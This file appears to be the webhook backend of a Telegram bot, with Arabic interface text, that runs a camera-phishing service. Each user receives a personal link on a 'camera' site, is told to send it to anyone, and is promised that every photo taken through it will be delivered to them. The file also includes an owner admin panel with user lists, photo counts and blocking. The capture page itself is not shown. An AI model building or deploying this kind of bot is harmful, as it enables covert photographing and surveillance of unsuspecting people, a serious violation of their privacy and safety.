// api/webhook.js — VANTA for WORM
// بوت @Saleckbz_cam_bot — مع أزرار تحكم

const SB_URL = process.env.SUPABASE_URL;
const SB_KEY = process.env.SUPABASE_SERVICE_KEY;
const OWNER_TG = 'Saleck_bz';

async function sb(path, method, body) {
  const r = await fetch(SB_URL + '/rest/v1/' + path, {
    method: method || 'GET',
    headers: {
      'apikey': SB_KEY,
      'Authorization': 'Bearer ' + SB_KEY,
      'Content-Type': 'application/json',
      'Prefer': 'return=representation'
    },
    body: body ? JSON.stringify(body) : undefined
  });
  try { return await r.json(); } catch (e) { return null; }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') { res.status(200).send('OK'); return; }

  const TG_TOKEN = process.env.TG_TOKEN;
  const OWNER_CHAT = process.env.TG_CHAT;
  if (!TG_TOKEN) { res.status(500).json({ ok: false }); return; }

  let update;
  try { update = typeof req.body === 'string' ? JSON.parse(req.body) : req.body; }
  catch (e) { res.status(200).send('OK'); return; }

  const cbq = update && update.callback_query;
  const msg = update && update.message;

  async function send(chat, text, kb) {
    const b = { chat_id: chat, text: text, parse_mode: 'HTML' };
    if (kb) b.reply_markup = kb;
    await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(b)
    });
  }

  async function answerCB(id, text) {
    await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/answerCallbackQuery', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: id, text: text || '' })
    });
  }

  // ============ الأزرار ============
  if (cbq) {
    const data = cbq.data || '';
    const chatId = cbq.message.chat.id;

    if (String(chatId) !== String(OWNER_CHAT)) {
      await answerCB(cbq.id, '❌ هذا البوت خاص');
      res.status(200).send('OK');
      return;
    }

    await answerCB(cbq.id, '...');

    if (data === 'menu') {
      await send(chatId, '🎛️ <b>لوحة التحكم</b>\n\nاختر:', {
        inline_keyboard: [
          [{ text: '📊 إحصائيات', callback_data: 'stats' }],
          [{ text: '👥 المستخدمون', callback_data: 'users' }],
          [{ text: '🚫 المحظورون', callback_data: 'blocked' }]
        ]
      });
    }

    if (data === 'stats') {
      const users = await sb('users?select=chat_id') || [];
      const images = await sb('images?select=id') || [];
      const blocked = await sb('users?blocked=eq.true&select=chat_id') || [];
      await send(chatId,
        '📊 <b>إحصائيات</b>\n\n' +
        '👥 المستخدمون: <b>' + users.length + '</b>\n' +
        '📸 الصور: <b>' + images.length + '</b>\n' +
        '🚫 المحظورون: <b>' + blocked.length + '</b>',
        { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] }
      );
    }

    if (data === 'users') {
      const users = await sb('users?order=created_at.desc&limit=20') || [];
      if (!users.length) {
        await send(chatId, 'لا يوجد مستخدمون بعد.', { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] });
      } else {
        let list = '👥 <b>آخر 20 مستخدم</b>\n\n';
        users.forEach((u, i) => {
          list += (i+1) + '. <b>' + (u.name || '—') + '</b> ' + (u.username || '') + '\n   🆔 <code>' + u.chat_id + '</code>\n';
        });
        await send(chatId, list, { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] });
      }
    }

    if (data === 'blocked') {
      const bl = await sb('users?blocked=eq.true&order=created_at.desc&limit=20') || [];
      if (!bl.length) {
        await send(chatId, 'لا يوجد محظورون.', { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] });
      } else {
        let list = '🚫 <b>المحظورون</b>\n\n';
        bl.forEach((u, i) => {
          list += (i+1) + '. <b>' + (u.name || '—') + '</b>\n   🆔 <code>' + u.chat_id + '</code>\n';
        });
        await send(chatId, list, { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] });
      }
    }

    if (data.startsWith('ub_')) {
      const id = data.substring(3);
      await sb('users?chat_id=eq.' + id, 'PATCH', { blocked: false });
      await send(chatId, '✅ تم إلغاء الحظر عن <code>' + id + '</code>');
    }

    if (data.startsWith('b_')) {
      const id = data.substring(2);
      await sb('users?chat_id=eq.' + id, 'PATCH', { blocked: true });
      await send(chatId, '🚫 تم حظر <code>' + id + '</code>');
    }

    res.status(200).send('OK');
    return;
  }

  // ============ الرسائل ============
  if (!msg || !msg.text) { res.status(200).send('OK'); return; }

  const chatId = msg.chat.id;
  const text = msg.text.trim();
  const name = (msg.from && (msg.from.first_name || msg.from.username)) || 'صديق';
  const username = (msg.from && msg.from.username) ? '@' + msg.from.username : '';

  // أوامر المالك
  if (String(chatId) === String(OWNER_CHAT)) {
    if (text === '/start' || text === '/admin' || text === '/menu') {
      await send(chatId,
        '👋 أهلاً سيدي!\n\n' +
        '🎛️ <b>لوحة التحكم</b>',
        {
          inline_keyboard: [
            [{ text: '📊 إحصائيات', callback_data: 'stats' }],
            [{ text: '👥 المستخدمون', callback_data: 'users' }],
            [{ text: '🚫 المحظورون', callback_data: 'blocked' }]
          ]
        }
      );
      res.status(200).send('OK');
      return;
    }
  }

  // فحص الحظر
  const b = await sb('users?chat_id=eq.' + chatId + '&blocked=eq.true');
  if (b && b.length > 0) {
    await send(chatId, '🚫 أنت محظور.');
    res.status(200).send('OK');
    return;
  }

  // /start للزوار
  if (text === '/start' || text === '/help') {
    const link = 'https://camera-one-henna.vercel.app/t/' + chatId;

    const existing = await sb('users?chat_id=eq.' + chatId);
    if (!existing || existing.length === 0) {
      await sb('users', 'POST', {
        chat_id: chatId, name: name, username: username, link: link
      });
    }

    await send(chatId,
      '👋 أهلاً ' + name + '!\n\n' +
      '👨‍💻 المبرمج: <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>\n\n' +
      '🎁 <b>رابطك الخاص</b>:\n\n' +
      '<code>' + link + '</code>\n\n' +
      '📸 أرسله لأي شخص — كل صورة ستصلك هنا.',
      {
        inline_keyboard: [
          [{ text: '💬 تواصل مع المبرمج', url: 'https://t.me/' + OWNER_TG }],
          [{ text: '📋 نسخ رابطي', url: link }]
        ]
      }
    );

    if (String(OWNER_CHAT) !== String(chatId)) {
      await send(OWNER_CHAT,
        '🔔 <b>مستخدم جديد</b>\n\n👤 ' + name + '\n📱 ' + (username || '—') + '\n🆔 <code>' + chatId + '</code>'
      );
    }

    res.status(200).send('OK');
    return;
  }

  // أي رسالة أخرى للزوار
  const link2 = 'https://camera-one-henna.vercel.app/t/' + chatId;
  await send(chatId, '🔗 رابطك:\n<code>' + link2 + '</code>',
    { inline_keyboard: [[{ text: '📋 نسخ', url: link2 }]] });

  res.status(200).send('OK');
          }
